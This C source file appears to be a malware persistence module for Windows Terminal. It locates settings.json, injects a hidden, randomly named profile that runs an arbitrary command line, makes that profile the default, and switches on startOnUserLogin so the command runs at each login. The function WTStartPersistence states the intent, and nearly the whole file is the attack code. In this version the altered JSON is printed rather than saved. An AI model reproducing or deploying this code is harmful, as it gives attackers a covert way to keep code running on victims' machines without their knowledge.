#include "pch.h"

BOOL WTFindSettingCallback
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{
	LPWSTR lpParentName = NULL;
	BOOL IsDone = FALSE;

	// C:\Users\Admin\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
	if (!StrStrW(lpPath, L"\\Packages\\Microsoft.WindowsTerminal_")) {
		goto CLEANUP;
	}

	*(LPWSTR*)(lpArgs) = StrConcatenateW(lpPath, L"\\LocalState\\settings.json");
	IsDone = TRUE;
CLEANUP:
	return IsDone;
}

LPWSTR WTFindSettingPath() {
	WCHAR lpLocalAppData[MAX_PATH];
	DWORD cbLocalAppData;
	LPWSTR lpResult = NULL;
	LPSTR lpJsonData = NULL;

	RtlSecureZeroMemory(lpLocalAppData, sizeof(lpLocalAppData));
	if (ExpandEnvironmentStringsW(L"%LOCALAPPDATA%", lpLocalAppData, MAX_PATH) >= MAX_PATH) {
		goto CLEANUP;
	}

	ListFileEx(lpLocalAppData, LIST_RECURSIVELY | LIST_JUST_FOLDER, WTFindSettingCallback, &lpResult);
	if (lpResult == NULL) {
		goto CLEANUP;
	}

CLEANUP:
	return lpResult;
}

BOOL WTChangeSettingsFile
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	DWORD dwInsertedPoint = 0;
	LPSTR lpGuid = NULL;
	CHAR szInsertedStr[0x400];
	DWORD cbInsertedStr = 0;
	LPSTR lpDoulbeSlashPath = NULL;
	LPSTR lpRandomStr = NULL;
	LPSTR lpNewJsonData = NULL;
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpGuid = GenGUIDStrA();
	if (lpGuid == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	lpRandomStr = GenRandomStr(6);
	sprintf_s(szInsertedStr, _countof(szInsertedStr), "            {\n                \"commandline\": \"%s\",\n                \"guid\": \"%s\",\n                \"hidden\": true,\n                \"name\": \"%s\"\n            },\n", lpCommandLine, lpGuid, lpRandomStr);

	dwInsertedPoint = StrStrA(lpJsonData, "\n    \"profiles\":\n") - lpJsonData + lstrlenA("\n    \"profiles\":\n");
	dwInsertedPoint = StrStrA(lpJsonData + dwInsertedPoint, "\n        \"list\":\n        [\n") - lpJsonData + lstrlenA("\n        \"list\":\n        [\n");
	lpNewJsonData = StrInsertA(lpJsonData, szInsertedStr, dwInsertedPoint);
	dwInsertedPoint = StrStrA(lpNewJsonData, "\n    \"defaultProfile\": \"") - lpNewJsonData;
	memcpy(lpNewJsonData + dwInsertedPoint, lpGuid, lstrlenA(lpGuid));
	lpTemp = StrStrA(lpNewJsonData, "\n    \"startOnUserLogin\": ");
	if (lpTemp) {
		dwInsertedPoint = lpTemp - lpNewJsonData + lstrlenA("\n    \"startOnUserLogin\": ");
		if (!IsStrStartsWithA(lpNewJsonData + dwInsertedPoint, "true")) {
			lpTemp = StrReplaceA(lpNewJsonData + dwInsertedPoint, "false", "true", FALSE, 1);
			lpNewJsonData[dwInsertedPoint] = '\0';
			lstrcatA(lpNewJsonData, lpTemp);
			FREE(lpTemp);
		}
	}
	else {
		dwInsertedPoint += lstrlenA(lpGuid) + 3;
		lpTemp = StrInsertA(lpNewJsonData, "    \"startOnUserLogin\": true,\n", dwInsertedPoint);
		FREE(lpNewJsonData);
		lpNewJsonData = lpTemp;
	}

	printf("%s\n", lpNewJsonData);
	Result = TRUE;
CLEANUP:
	if (lpGuid != NULL) {
		FREE(lpGuid);
	}

	if (lpDoulbeSlashPath != NULL) {
		FREE(lpDoulbeSlashPath);
	}

	if (lpNewJsonData != NULL) {
		FREE(lpNewJsonData);
	}

	if (lpRandomStr != NULL) {
		FREE(lpRandomStr);
	}

	if (lpJsonData != NULL) {
		FREE(lpJsonData);
	}

	return Result;
}

BOOL WTStartPersistence
(
	_In_ LPSTR lpCommandLine
)
{
	LPWSTR lpSettingsPath = NULL;
	BOOL Result = FALSE;

	lpSettingsPath = WTFindSettingPath();
	if (lpSettingsPath == NULL) {
		goto CLEANUP;
	}

	wprintf(L"lpSettingsPath: %lls\n", lpSettingsPath);
	WTChangeSettingsFile(lpSettingsPath, lpCommandLine);
	Result = TRUE;
CLEANUP:
	if (lpSettingsPath != NULL) {
		FREE(lpSettingsPath);
	}

	return Result;
}